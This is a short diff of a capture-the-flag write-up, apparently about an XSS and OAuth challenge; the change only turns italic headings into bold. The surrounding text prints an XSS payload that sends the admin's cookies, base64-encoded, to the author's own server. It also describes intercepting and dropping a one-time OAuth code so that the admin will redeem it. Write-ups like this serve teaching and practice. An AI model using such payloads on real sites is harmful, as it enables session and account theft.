@@ -33,7 +33,7 @@ GREAT, so we have something now.
 
 I tried to get the cookies by `<script>document.location.href = "myvps.com/" + btoa(document.cookie)</script>` but it seems all the cookies on the admin were HTTPOnly, so no luck there.
 
-*Failed Attempt*
+**Failed Attempt**
 
 Next I realized that I could probably steal the admin's oath code if I somehow make the callback redirect to a page where the note with my XSS is stored.
 So, I did the following
@@ -61,7 +61,7 @@ The state is not checked so you can also omit it.
 
 But the whitelisting on the redirect URI was strong and I couldn't change it, so this method failed.
 
-*Successful Attempt*
+**Successful Attempt**
 
 I also noticed that the oauth code was one-time only. So I fired up burpsuite to intercept this code and drop the request. This was so that my code can be used by someone else (this someone is going to be the admin)
 
